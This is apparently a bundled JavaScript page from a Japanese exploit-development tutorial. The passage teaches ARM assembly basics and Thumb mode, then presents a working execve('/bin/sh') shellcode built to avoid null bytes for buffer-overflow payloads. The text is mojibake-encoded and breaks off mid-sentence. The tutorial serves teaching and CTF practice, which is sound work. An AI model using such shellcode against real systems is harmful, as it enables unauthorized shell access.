(window.webpackJsonp=window.webpackJsonp||[]).push([[8],{214:function(t,a,s){"use strict";s.r(a);var e=s(0),n=Object(e.a)({},(function(){var t=this,a=t.$createElement,s=t._self._c||a;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"_1-crafting-shellcode"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-crafting-shellcode","aria-hidden":"true"}},[t._v("#")]),t._v(" 1. Crafting Shellcode ğŸš")]),t._v(" "),s("p",[t._v("ç¬¬1ç« ã§ã¯ã€Exploitã«ã¯æ¬ ã‹ã›ãªã„ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ä½œæˆã‚’é€šã—ã¦ã€ARM ã‚¢ã‚»ãƒ³ãƒ–ãƒªã®åŸºæœ¬çš„ãªæ§‹æ–‡ã‚„ä»•çµ„ã¿ã«ã¤ã„ã¦ç°¡å˜ã«ã”èª¬æ˜ã‚’ã—ã¾ã™ã€‚æœ€å¾Œã«ã€å®Ÿéš›ã«ä½œæˆã—ãŸã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ç”¨ã„ã¦ã€æ¼”ç¿’å•é¡Œã§ã‚·ã‚§ãƒ«ã‚’å¥ªå–ã™ã‚‹ç·´ç¿’ã‚’ã—ã¾ã™ã€‚")]),t._v(" "),s("h2",{attrs:{id:"_1-1-arm-ã‚¢ã‚»ãƒ³ãƒ–ãƒªåŸºç¤"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-1-arm-ã‚¢ã‚»ãƒ³ãƒ–ãƒªåŸºç¤","aria-hidden":"true"}},[t._v("#")]),t._v(" 1.1 ARM ã‚¢ã‚»ãƒ³ãƒ–ãƒªåŸºç¤")]),t._v(" "),s("p",[t._v("ARM ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¯ã€RISCï¼ˆReduced Instruction Set Computing)ï¼‰ã§ã€ãƒ­ãƒ¼ãƒ‰/ã‚¹ãƒˆã‚¢ãªã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã§ã™ã€‚ãƒ¡ãƒ¢ãƒªã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ä»‹ã—ãŸãƒ­ãƒ¼ãƒ‰ã€ã‚¹ãƒˆã‚¢å‘½ä»¤ã®ã¿ã§ã™ã€‚ARM ã®ä¸»è¦ãªãƒ¬ã‚¸ã‚¹ã‚¿ã«ã¯ã€r0 ~ r15ãƒ¬ã‚¸ã‚¹ã‚¿ã¨cpsrãƒ¬ã‚¸ã‚¹ã‚¿ãªã©ãŒã‚ã‚Šã¾ã™ã€‚ç‰¹ã«r11 ~ r15ã‚¸ãƒ¬ã‚¹ã‚¿ã¯ç‰¹æ®Šãªç”¨é€”ã«ä½¿ã‚ã‚Œã‚‹ãŸã‚åˆ¥åãŒä»˜ã‘ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ä»¥ä¸‹ã«ãƒ¬ã‚¸ã‚¹ã‚¿ã®æ¦‚è¦ã‚’ã¾ã¨ã‚ã¾ã™ã€‚")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",{staticStyle:{"text-align":"center"}},[t._v("ãƒ¬ã‚¸ã‚¹ã‚¿")]),t._v(" "),s("th",{staticStyle:{"text-align":"left"}},[t._v("æ¦‚è¦")])])]),t._v(" "),s("tbody",[s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r0")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("é–¢æ•°ã®æˆ»ã‚Šå€¤ã®ä¿å­˜ã€é–¢æ•°ã®ç¬¬1å¼•æ•°ã«åˆ©ç”¨")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r1")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("é–¢æ•°ã®ç¬¬2å¼•æ•°ã«åˆ©ç”¨")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r2")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("é–¢æ•°ã®ç¬¬3å¼•æ•°ã«åˆ©ç”¨")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r3")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("é–¢æ•°ã®ç¬¬4å¼•æ•°ã«åˆ©ç”¨")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r4 ~ r8")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("æ±ç”¨çš„ã«åˆ©ç”¨")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r8")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("æ±ç”¨çš„ã«åˆ©ç”¨")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r9")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("æ±ç”¨çš„ã«åˆ©ç”¨")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r10")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("æ±ç”¨çš„ã«åˆ©ç”¨")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r11")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ï¼ˆåˆ¥åfpï¼‰")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r12")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ã‚¤ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚·ãƒ§ãƒ³ãƒã‚¤ãƒ³ã‚¿ï¼ˆåˆ¥åipï¼‰")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r13")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ã‚¹ã‚¿ãƒƒã‚¯ãƒã‚¤ãƒ³ã‚¿ï¼ˆåˆ¥åspï¼‰")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r14")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿ï¼ˆåˆ¥ålrï¼‰")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r15")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚«ã‚¦ãƒ³ã‚¿ï¼ˆåˆ¥åpcï¼‰")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("cpsr")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ã‚«ãƒ¬ãƒ³ãƒˆãƒ—ãƒ­ã‚°ãƒ©ãƒ ãƒ¢ãƒ¼ãƒ‰ãƒ¬ã‚¸ã‚¹ã‚¿")])])])]),t._v(" "),s("p",[t._v("cpsrãƒ¬ã‚¸ã‚¹ã‚¿ã¯x86ã®eflagsãƒ¬ã‚¸ã‚¹ã‚¿ã®ã‚ˆã†ãªã‚‚ã®ã§ãƒ•ãƒ©ã‚°ç®¡ç†ã‚’ã—ã¦ã„ã¾ã™ã€‚ç‰¹ã«ä¸‹ä½5bitç›®ã®ãƒ•ãƒ©ã‚°ã¯é‡è¦ãªå€¤ã«ãªã£ã¦ãŠã‚Šã€ARMãƒ¢ãƒ¼ãƒ‰ã¨Thumbãƒ¢ãƒ¼ãƒ‰ã¨å‘¼ã°ã‚Œã‚‹2ã¤ã®ãƒ¢ãƒ¼ãƒ‰ã®çŠ¶æ…‹ã‚’ç¤ºã™å½¹å‰²ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ARMãƒ¢ãƒ¼ãƒ‰ãŒåŸºæœ¬çš„ãªãƒ¢ãƒ¼ãƒ‰ã§ã™ã€‚Thumbãƒ¢ãƒ¼ãƒ‰ã«ã¤ã„ã¦ã¯å¾Œè¿°ã—ã¾ã™ã€‚")]),t._v(" "),s("p",[t._v("ARM ã‚¢ã‚»ãƒ³ãƒ–ãƒªã«ã¯ã¨ã¦ã‚‚å¤šãã®å‘½ä»¤ãŒã‚ã‚Šã¾ã™ã€‚ã‚ˆãä½¿ã‚ã‚Œã‚‹ä»£è¡¨çš„ãªå‘½ä»¤ã‚’ä»¥ä¸‹ã«ç¤ºã—ã¾ã™ã€‚")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",{staticStyle:{"text-align":"left"}},[t._v("å‘½ä»¤")]),t._v(" "),s("th",{staticStyle:{"text-align":"left"}},[t._v("å‹•ä½œ")]),t._v(" "),s("th",{staticStyle:{"text-align":"left"}},[t._v("å‘½ä»¤")]),t._v(" "),s("th",{staticStyle:{"text-align":"left"}},[t._v("å‹•ä½œ")])])]),t._v(" "),s("tbody",[s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("MOV")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("å€¤ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("PUSH")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ã‚¹ã‚¿ãƒƒã‚¯ã«å€¤ã‚’pushã™ã‚‹")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("MVN")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("å€¤ã®2ã®è£œæ•°ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("POP")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰å€¤ã‚’popã™ã‚‹")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("ADD/SUB")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("åŠ ç®—/æ¸›ç®—ã‚’è¡Œã†")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("LDR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ãƒ¡ãƒ¢ãƒªã‹ã‚‰å€¤ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("AND/OR/EOR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("è«–ç†ç©/è«–ç†å’Œ/æ’ä»–çš„è«–ç†å’Œã‚’è¡Œã†")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("STR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ãƒ¡ãƒ¢ãƒªã«å€¤ã‚’ã‚¹ãƒˆã‚¢ã™ã‚‹")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("LSL/LSR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("è«–ç†å·¦/å³ã‚·ãƒ•ãƒˆã‚’è¡Œã†")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("B")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("åˆ¶å¾¡ã‚’ç„¡æ¡ä»¶ã«ç§»ã™")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("ASR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("ç®—è¡“å³ã‚·ãƒ•ãƒˆã‚’è¡Œã†")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("BL")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("æ¬¡ã®å‘½ä»¤ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’lrãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã—ã€åˆ¶å¾¡ã‚’ç§»ã™")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("CMP")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("å€¤ã‚’æ¯”è¼ƒã—ã€csprãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã‚’æ›´æ–°ã™ã‚‹")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("BX")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("åˆ¶å¾¡ã‚’ç„¡æ¡ä»¶ã«ç§»ã™ã€‚é£›ã³å…ˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®æœ«å°¾1bitã«ã‚ˆã‚Šãƒ¢ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹")])])])]),t._v(" "),s("p",[t._v("å®Ÿéš›ã«ARMã‚¢ã‚»ãƒ³ãƒ–ãƒªã§ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’ä½œæˆã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚"),s("code",[t._v("Hello")]),t._v(" ã‚’å‡ºåŠ›ã™ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ "),s("code",[t._v("hello.asm")]),t._v(" ã‚’ä½œæˆã—ã¾ã™ã€‚æ§˜ã€…ãªå‘½ä»¤ã‚’ç´¹ä»‹ã™ã‚‹ãŸã‚ã«å°‘ã—å†—é•·ã«æ§‹ç¯‰ã—ã¦ã„ã¾ã™ã€‚ã”å­˜çŸ¥ã®é€šã‚Šå‘½ä»¤ã®ç¨®é¡ã¯ã¨ã¦ã‚‚å¤šã„ã®ã§ã€ä¸€éƒ¨ã®ã¿å–ã‚Šæ‰±ã„ã¾ã™ã€‚")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('.text\n.global _start\n_start:\n        eor r0, r0     @ r0 = 0\n        add r0, #1     @ r0 += 1\n        adr r1, s      @ r1 = &s\n        mov r2, #6     @ r2 = 6\n        mov r7, #4     @ r7 = 4\n        svc 0          @ write(1, &s, 6)\n        eor r0, r0     @ r0 = 0\n        add r7, r0, #1 @ r7 = 1\n        svc 0          @ exit(0)\ns:\n  .asciz "Hello\\n"\n')])])]),s("p",[t._v("å„è¡Œã®å‘½ä»¤ã«ã¤ã„ã¦è£œè¶³ã—ã¦ã„ãã¾ã™ã€‚eor å‘½ä»¤ã¯ã€xorã‚’è¡Œã†å‘½ä»¤ã§ã™ã€‚å¼•æ•°ã«åŒã˜r0 ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’å–ã£ã¦ã„ã‚‹ãŸã‚0åˆæœŸåŒ–ã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚add å‘½ä»¤ã¯ã€åŠ ç®—ã‚’è¡Œã†å‘½ä»¤ã§ã™ã€‚2ç•ªç›®ã®ã‚ªãƒšãƒ©ãƒ³ãƒ‰ã¯ã€å³å€¤ã‚’è¡¨ã—ã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦æœ¬å‘½ä»¤ã¯ã€r0ã«r0+1ã‚’ä»£å…¥ã™ã‚‹å‘½ä»¤ã«ãªã£ã¦ã„ã¾ã™ã€‚adr å‘½ä»¤ã¯ã€ãƒ©ãƒ™ãƒ«ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç¬¬1ã‚ªãƒšãƒ©ãƒ³ãƒ‰ã«ä»£å…¥ã™ã‚‹ç”¨é€”ã§ä½¿ã£ã¦ã„ã¾ã™ã€‚mov å‘½ä»¤ã¯ã€å€¤ã‚’ä»£å…¥ã™ã‚‹å‘½ä»¤ã§ã™ã€‚svc å‘½ä»¤ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’ç™ºè¡Œã™ã‚‹å‘½ä»¤ã§ã™ã€‚ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’ç›´æ¥å‘¼ã¶å ´åˆã¯ã€r7ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ç•ªå·ã€r0 ~ r6ãƒ¬ã‚¸ã‚¹ã‚¿ã«å¼•æ•°ã‚’ã‚»ãƒƒãƒˆã—ã¦ã€svc å‘½ä»¤ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã¾ãŸã€æˆ»ã‚Šå€¤ã¯r0ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã‚»ãƒƒãƒˆã•ã‚Œã¾ã™ã€‚ã¾ãŸã€svc å‘½ä»¤ã®ã‚ªãƒšãƒ©ãƒ³ãƒ‰ã¯åŸºæœ¬çš„ã«ç„¡è¦–ã•ã‚Œã¾ã™ã€‚ã“ã“ã§ã¯ã€r7 ãƒ¬ã‚¸ã‚¹ã‚¿ã«4ãŒå…¥ã£ã¦ã„ã‚‹ãŸã‚write ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’ç™ºè¡Œã—ã€"),s("code",[t._v("Hello\\n")]),t._v(" ã‚’å‡ºåŠ›ã—ã¾ã™ã€‚ãã®å¾Œã®3å‘½ä»¤ã¯ã‚‚ã†èª­ã¿è§£ã‘ã‚‹ã§ã—ã‚‡ã†ã€‚ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ç•ªå·ã‚’èª¿ã¹ã‚‹éš›ã«ã¯ã€"),s("code",[t._v("ausyscall")]),t._v(" ã‚³ãƒãƒ³ãƒ‰ãŒä¾¿åˆ©ã§ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«åã‚’ä¸ãˆã‚‹ã“ã¨ã§ã€ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ç•ªå·ã‚’è¡¨ç¤ºã—ã¦ãã‚Œã¾ã™ã€‚")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ ausyscall "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),t._v("              "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v("\nwritev             "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("146")]),t._v("\npwrite64           "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("181")]),t._v("\npciconfig_write    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("273")]),t._v("\npwritev            "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("362")]),t._v("\nprocess_vm_writev  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("377")]),t._v("\npwritev2           "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("393")]),t._v("\n")])])]),s("p",[t._v("ã¾ãŸã€æœ¬ã‚³ãƒ¼ãƒ‰ã‹ã‚‰å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹éš›ã«ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«"),s("code",[t._v("as")]),t._v(" ã¨"),s("code",[t._v("ld")]),t._v(" ã‚³ãƒãƒ³ãƒ‰ã‚’ç”¨ã„ã¾ã™ã€‚å®Ÿè¡Œã™ã‚‹ã¨å‰è¿°ã—ãŸé€šã‚Šæ–‡å­—åˆ—ã‚’è¡¨ç¤ºã—ã¦çµ‚äº†ã—ã¾ã™ã€‚")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ as hello.asm -o hello.o\n$ ld hello.o -o hello\n$ ./hello\nHello\n")])])]),s("h3",{attrs:{id:"thumb-ãƒ¢ãƒ¼ãƒ‰"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#thumb-ãƒ¢ãƒ¼ãƒ‰","aria-hidden":"true"}},[t._v("#")]),t._v(" Thumb ãƒ¢ãƒ¼ãƒ‰")]),t._v(" "),s("p",[t._v("ARMã«ã¯ã€é€šå¸¸ã®ARMãƒ¢ãƒ¼ãƒ‰ã¨Thumbãƒ¢ãƒ¼ãƒ‰ã®2ã¤ã®ãƒ¢ãƒ¼ãƒ‰ãŒå­˜åœ¨ã—ã¾ã™ã€‚ä»¥ä¸‹ã«ä¸»ãªé•ã„ã‚’ç¤ºã—ã¾ã™ã€‚")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",{staticStyle:{"text-align":"center"}},[t._v("è¦³ç‚¹")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("ARM ãƒ¢ãƒ¼ãƒ‰")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("Thumb ãƒ¢ãƒ¼ãƒ‰")])])]),t._v(" "),s("tbody",[s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("å‘½ä»¤èªã®é•·ã•")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4 byte")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("2 byte")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("æ‰±ãˆã‚‹æ±ç”¨ãƒ¬ã‚¸ã‚¹ã‚¿ã®æ•°")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("16å€‹")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("8å€‹")])])])]),t._v(" "),s("p",[t._v("ARM ãƒ¢ãƒ¼ãƒ‰ã¨Thumb ãƒ¢ãƒ¼ãƒ‰ã®åˆ‡ã‚Šæ›¿ãˆã«ã¯ã€BX å‘½ä»¤ã¨BLX å‘½ä»¤ãŒåˆ©ç”¨ã•ã‚Œã¾ã™ã€‚"),s("code",[t._v("BX r0")]),t._v(" ã®ã‚ˆã†ã«ãƒ¬ã‚¸ã‚¹ã‚¿æŒ‡å®šã§åˆ¶å¾¡ãŒç§»ã‚‹å ´åˆã¯ã€ãƒ¬ã‚¸ã‚¹ã‚¿ã®ä¸­èº«ãŒå¶æ•°ã§ã‚ã‚Œã°ARM ãƒ¢ãƒ¼ãƒ‰ã€å¥‡æ•°ã§ã‚ã‚Œã°Thumb ãƒ¢ãƒ¼ãƒ‰ã«åˆ‡ã‚Šæ›¿ã‚ã‚Šã¾ã™ã€‚ã‚ˆãã‚ã‚‹ä¾‹ã¨ã—ã¦ã€"),s("code",[t._v("add r3, pc, #1; bx r3")]),t._v(" ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€r3 ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã¯ã€pc+1ã®å¥‡æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæ ¼ç´ã•ã‚Œã€ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«å¯¾ã—ã¦ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹ãŸã‚ã€å…ƒãŒARM ãƒ¢ãƒ¼ãƒ‰ã®å ´åˆã¯Thumb ãƒ¢ãƒ¼ãƒ‰ã«åˆ‡ã‚Šæ›¿ã‚ã‚Šã¾ã™ã€‚")]),t._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",[t._v("Exploité–‹ç™ºã«ãŠã„ã¦ã¯ã€Thumbãƒ¢ãƒ¼ãƒ‰ã¯å‘½ä»¤èªã®é•·ã•ãŒçŸ­ã„ãŸã‚ã€é•·ã•åˆ¶é™ãªã©ãŒã‚ã‚‹å ´åˆã«ã¯ã¨ã¦ã‚‚ä¾¿åˆ©ã§ã™ã€‚")])]),t._v(" "),s("h2",{attrs:{id:"_1-2-ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ä½œæˆ"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ä½œæˆ","aria-hidden":"true"}},[t._v("#")]),t._v(" 1.2 ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ä½œæˆ")]),t._v(" "),s("p",[t._v("æœ€ã‚‚ä»£è¡¨çš„ãªã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯ã€"),s("code",[t._v('execve("/bin/sh", NULL, NULL)')]),t._v(" ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã‚’ãƒªãƒ¢ãƒ¼ãƒˆå´ã®ã‚µãƒ¼ãƒä¸Šã§å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒã®ã‚·ã‚§ãƒ«ã‚’å¥ªå–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ARM ã§ã¯ "),s("code",[t._v("execve")]),t._v(" ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã®ç•ªå·ã¯ã€11ã¨ãªã£ã¦ã„ã¾ã™ã€‚ãã®ãŸã‚ã€r7 ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã¯11ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å¼•æ•°ã«ã¯r0ãƒ¬ã‚¸ã‚¹ã‚¿ã«"),s("code",[t._v("/bin/sh")]),t._v(" ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã€r1ãƒ¬ã‚¸ã‚¹ã‚¿ã¨r2ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã¯0ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®çŠ¶æ…‹ã§ã€svc å‘½ä»¤ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã‚·ã‚§ãƒ«ã‚’èµ·å‹•ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ä¾‹ã‚’ç¤ºã—ã¾ã™ã€‚")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('.text\n.global _start\n\n_start:\n        .code 32\n        add r3, pc, #1\n        bx r3\n\n        .code 16\n        adr r0, s\n        mov r7, #11\n        eor r1, r1\n        eor r2, r2\n        strb r2, [r0, #7]\n        svc #1\ns:      .asciz "/bin/shA"\n')])])]),s("p",[t._v("ã“ã“ã§ã¯ã€Thumbãƒ¢ãƒ¼ãƒ‰ã‚‚ç”¨ã„ã¦ãƒã‚¤ãƒˆæ•°ã‚’å‰Šã‚‹è©¦ã¿ã‚‚ã—ã¦ã„ã¾ã™ã€‚"),s("code",[t._v("bx r3")]),t._v(" ã§ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹éš›ã«"),s("code",[t._v("adr r0, s")]),t._v(" ã®ã‚¢ãƒ‰ãƒ¬ã‚¹+1ã—ãŸå€¤ã«é£›ã¼ã†ã¨ã—ã¦ã¾ã™ï¼ˆARMã§ã¯PCã¯å®Ÿè¡Œä¸­ã®å‘½ä»¤+8ã‚’æŒ‡ã™ï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Š"),s("code",[t._v("adr r0, s")]),t._v(" ã‹ã‚‰ã¯Thumb ãƒ¢ãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚æ–‡å­—åˆ—"),s("code",[t._v("s")]),t._v(" ã§ã¯ã€æœ«å°¾ã«"),s("code",[t._v("A")]),t._v("ãŒä½™åˆ†ã«ã¤ã„ã¦ã„ã¾ã™ã€‚æœ¬æ¥ã§ã‚ã‚Œã°NULLçµ‚ç«¯ã‚’ã•ã›ãŸã„ã¨ã“ã‚ã§ã™ãŒã€Buffer Overflowã‚’æ‹›ãä»£è¡¨çš„ãªstrcpyé–¢æ•°ãªã©ã§ã¯ã€NULLçµ‚ç«¯ã—ã¦ã—ã¾ã„ã¾ã™ã€‚ãã®ãŸã‚æ”»æ’ƒç”¨ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚³ãƒ”ãƒ¼ãŒæ„å›³ã—ãªã„ã¨ã“ã‚ã§æ­¢ã¾ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãã“ã§ã€"),s("code",[t._v("strb r2, [r0, #7]")]),t._v(" ã‚’ä½¿ã£ã¦ã€æ–‡å­—åˆ—"),s("code",[t._v("s")]),t._v(" ã®ã‚¢ãƒ‰ãƒ¬ã‚¹+7ã‚’ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆ"),s("code",[t._v("A")]),t._v("ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼‰ã«å¯¾ã—ã¦ã€r2ã‚¸ãƒ¬ã‚¹ã‚¿ã®å€¤ã‚’ã‚¹ãƒˆã‚¢ã—ã¦ã„ã¾ã™ã€‚r2 